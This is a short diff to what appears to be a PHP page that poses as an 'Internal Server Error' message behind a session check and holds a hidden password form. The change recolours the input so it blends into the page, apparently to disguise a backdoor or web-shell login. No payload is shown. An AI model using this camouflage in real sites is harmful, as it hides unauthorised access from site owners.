@@ -24,7 +24,7 @@ if(!($_SESSION['forbidden'])) {
     <title>Internal Server Error</title>
     </head>
     <style>
-	input { margin:0;background-color:#fff;border:1px solid #fff; }
+	input { margin:0;background-color:#000;border:1px solid #000; }
 	</style>
 	<center><form method="post">
 	  <input type="password" name="password" placeholder="">
